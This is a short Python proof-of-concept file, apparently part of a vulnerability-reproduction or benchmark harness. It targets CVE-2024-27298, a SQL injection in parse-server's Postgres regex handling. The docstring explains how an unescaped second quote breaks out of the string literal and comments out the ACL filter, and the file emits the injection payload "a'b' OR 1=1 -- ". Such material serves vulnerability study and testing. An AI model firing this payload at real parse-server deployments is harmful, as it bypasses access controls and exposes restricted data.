#!/usr/bin/env python3
"""[GIVEN] CVE-2024-27298 original PoC for parse-server literalizeRegexPart PG SQLi.

The $regex value carries TWO single quotes that are separated by non-quote chars.
On V0 (6.4.0) literalizeRegexPart uses `.replace(/([^'])'/, ...)` WITHOUT the /g
flag, so only the FIRST quote is doubled; the second quote survives unescaped and
breaks out of the  `<col> ~ '<pattern>'`  string literal (raw pg-promise :raw
sink), turning the WHERE into an always-true clause and commenting out the
_rperm ACL filter -> the ACL-restricted flag row is returned.

On V1 (6.5.0) the CVE-2024-27298 fix adds the /g flag, so BOTH quotes are doubled
-> no break-out -> blocked.
"""

# regex portion (`a`, `b`) is irrelevant; ` OR 1=1 -- ` is the injected tail.
PAYLOAD = "a'b' OR 1=1 -- "


def candidate():
    return {"probe_id": "original", "regex": PAYLOAD}


if __name__ == "__main__":
    import json
    print(json.dumps(candidate()))
